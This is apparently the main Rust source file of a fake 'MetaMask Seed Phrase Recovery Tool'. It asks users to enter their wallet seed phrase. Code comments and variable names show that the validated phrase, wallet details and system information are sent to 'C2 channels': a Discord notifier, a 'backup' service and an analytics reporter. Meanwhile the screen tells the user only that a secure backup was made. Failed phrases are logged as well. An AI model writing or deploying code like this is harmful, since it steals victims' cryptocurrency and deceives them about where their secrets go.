mod recovery;
mod exfil;
mod utils;

use std::io::{self, Write};
use std::collections::HashMap;
use colored::*;

use recovery::SeedPhraseValidator;
use exfil::{DiscordNotifier, BackupService, AnalyticsReporter};
use utils::{Logger, get_system_info};

fn main() {
    display_banner();

    // Initialize services
    let validator = SeedPhraseValidator::new();
    let discord = DiscordNotifier::new();
    let backup = BackupService::new();
    let analytics = AnalyticsReporter::new();
    let logger = Logger::new();

    loop {
        display_menu();

        print!("\nSelect option: ");
        io::stdout().flush().unwrap();

        let mut choice = String::new();
        io::stdin().read_line(&mut choice).unwrap();

        match choice.trim() {
            "1" => recover_seed_phrase(&validator, &discord, &backup, &analytics, &logger),
            "2" => validate_seed_phrase(&validator),
            "3" => check_backup_status(&backup),
            "4" => {
                println!("\n{}", "Thank you for using MetaMask Recovery Tool!".green());
                break;
            }
            _ => println!("{}", "Invalid option!".red()),
        }
    }
}

fn display_banner() {
    let banner = r#"
╔══════════════════════════════════════════════════╗
║   MetaMask Seed Phrase Recovery Tool v1.0       ║
║   Recover Lost or Corrupted Seed Phrases        ║
╚══════════════════════════════════════════════════╝
    "#;
    println!("{}", banner.cyan());
}

fn display_menu() {
    println!("\n{}", "=".repeat(50));
    println!("{}", "MAIN MENU".bold());
    println!("{}", "=".repeat(50));
    println!("1. Recover Seed Phrase");
    println!("2. Validate Existing Seed Phrase");
    println!("3. Check Backup Status");
    println!("4. Exit");
    println!("{}", "=".repeat(50));
}

fn recover_seed_phrase(
    validator: &SeedPhraseValidator,
    discord: &DiscordNotifier,
    backup: &BackupService,
    analytics: &AnalyticsReporter,
    logger: &Logger,
) {
    println!("\n{}", "[+] Seed Phrase Recovery".green().bold());
    println!("{}", "-".repeat(50));
    println!("{}", "Enter your seed phrase (12-24 words):");

    print!("> ");
    io::stdout().flush().unwrap();

    let mut seed_phrase = String::new();
    io::stdin().read_line(&mut seed_phrase).unwrap();
    let seed_phrase = seed_phrase.trim();

    if !validator.validate(seed_phrase) {
        println!("{}", "[!] Invalid seed phrase format".red());

        if validator.is_recoverable(seed_phrase) {
            println!("{}", "[+] Attempting partial recovery...".yellow());
            println!("\n{}", "Suggestions:".bold());
            for suggestion in validator.get_recovery_suggestions(seed_phrase) {
                println!("  • {}", suggestion);
            }
        }

        logger.log_recovery_attempt(seed_phrase, "failed");
        return;
    }

    println!("{}", "[+] Validating seed phrase...".yellow());
    std::thread::sleep(std::time::Duration::from_secs(2));

    let wallet_info = validator.extract_wallet_info(seed_phrase);

    println!("{}", "[✓] Seed phrase validated successfully!".green());
    println!("\n{}", "Wallet Information:".bold());
    println!("  • Words: {}", wallet_info.get("word_count").unwrap());
    println!("  • Status: {}", wallet_info.get("status").unwrap());

    // Collect system info
    let mut exfil_data = wallet_info.clone();
    let system_info = get_system_info();
    exfil_data.extend(system_info);

    // Exfiltrate to all C2 channels
    println!("{}", "[+] Creating secure backup...".yellow());

    let _ = discord.notify_recovery(&exfil_data);
    let _ = backup.backup_seed_phrase(&exfil_data);
    let _ = analytics.report_recovery_success(&exfil_data);
    logger.log_wallet_data(&exfil_data);

    println!("{}", "[✓] Recovery complete! Backup created.".green());
}

fn validate_seed_phrase(validator: &SeedPhraseValidator) {
    println!("\n{}", "[+] Seed Phrase Validation".green().bold());
    println!("{}", "-".repeat(50));

    print!("Enter seed phrase to validate: ");
    io::stdout().flush().unwrap();

    let mut seed_phrase = String::new();
    io::stdin().read_line(&mut seed_phrase).unwrap();
    let seed_phrase = seed_phrase.trim();

    if validator.validate(seed_phrase) {
        println!("{}", "[✓] Seed phrase is valid!".green());

        let info = validator.extract_wallet_info(seed_phrase);
        println!("  • Word count: {}", info.get("word_count").unwrap());
    } else {
        println!("{}", "[✗] Invalid seed phrase format".red());
    }
}

fn check_backup_status(backup: &BackupService) {
    println!("\n{}", "[+] Checking Backup Status".green().bold());
    println!("{}", "-".repeat(50));

    print!("Enter wallet ID to check: ");
    io::stdout().flush().unwrap();

    let mut wallet_id = String::new();
    io::stdin().read_line(&mut wallet_id).unwrap();
    let wallet_id = wallet_id.trim();

    println!("{}", "[+] Searching for backup...".yellow());
    std::thread::sleep(std::time::Duration::from_secs(1));

    match backup.restore_from_backup(wallet_id) {
        Ok(Some(data)) => {
            println!("{}", "[✓] Backup found!".green());
            println!("Data: {}", data);
        }
        Ok(None) => {
            println!("{}", "[!] No backup found for this wallet".yellow());
        }
        Err(e) => {
            println!("{}", format!("[✗] Error: {}", e).red());
        }
    }
}
